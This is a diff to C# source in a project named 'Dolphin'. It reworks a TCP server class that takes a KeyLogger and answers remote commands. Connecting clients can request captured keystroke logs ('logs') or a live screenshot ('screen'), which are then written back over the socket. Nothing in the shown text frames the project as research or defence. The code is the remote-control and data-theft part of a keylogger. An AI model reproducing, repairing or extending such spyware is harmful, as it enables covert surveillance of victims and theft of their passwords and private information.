@@ -14,7 +14,6 @@ namespace Dolphin
     static class Server
     {
         private static string DataToSend { get; set; } = "";
-        private static bool DataReady { get; set; } = false;
 
         public static void Run(KeyLogger logger)
         {
@@ -26,36 +25,33 @@ namespace Dolphin
             byte[] buffer = new byte[255];
             try
             {
-                TcpClient client = listener.AcceptTcpClient();
-                NetworkStream stream = client.GetStream();
                 while (true)
                 {
-                    if (DataReady)
+                    TcpClient client = listener.AcceptTcpClient();
+                    NetworkStream stream = client.GetStream();
+
+
+                    int bytes = stream.Read(buffer, 0, buffer.Length);
+                    string command = Encoding.UTF8.GetString(buffer, 0, bytes);
+                    if (command == "quit")
                     {
+                        byte[] data = Encoding.UTF8.GetBytes("OK");
+                        stream.Write(data, 0, data.Length);
+                        break;
+                    }
+                    if (command == "logs")
+                    {
+                        CopyData(logger.LogsStream);
                         SendLogs(stream);
                     }
-
-                    if (stream.DataAvailable)
+                    else if (command == "screen")
                     {
-                        int bytes = stream.Read(buffer, 0, buffer.Length);
-                        string command = Encoding.UTF8.GetString(buffer, 0, bytes);
-                        if (command == "quit")
-                        {
-                            break;
-                        }
-                        if (command == "logs")
-                        {
-                            CopyData(logger.LogsStream);
-                        }
-                        else if (command == "screen")
-                        {
-                            var img = logger.Screenshot();
-                            SendScreen(stream, img);
-                        }
+                        SendScreen(stream);
                     }
+
+                    stream.Close();
+                    client.Close();
                 }
-                stream.Close();
-                client.Close();
 
             }
             catch (Exception e)
@@ -73,7 +69,6 @@ namespace Dolphin
         {
             DataToSend = stream.ToString();
             stream.Clear();
-            DataReady = true;
         }
 
         private static void SendLogs(NetworkStream stream)
@@ -81,10 +76,9 @@ namespace Dolphin
             byte[] data = Encoding.UTF8.GetBytes(DataToSend);
 
             stream.Write(data, 0, data.Length);
-            DataReady = false;
             DataToSend = "";
         }
-        private static void SendScreen(NetworkStream stream, Bitmap img)
+        private static void SendScreen(NetworkStream stream)
         {
             Rectangle bounds = Screen.GetBounds(Point.Empty);
             using var memoryStream = new MemoryStream();
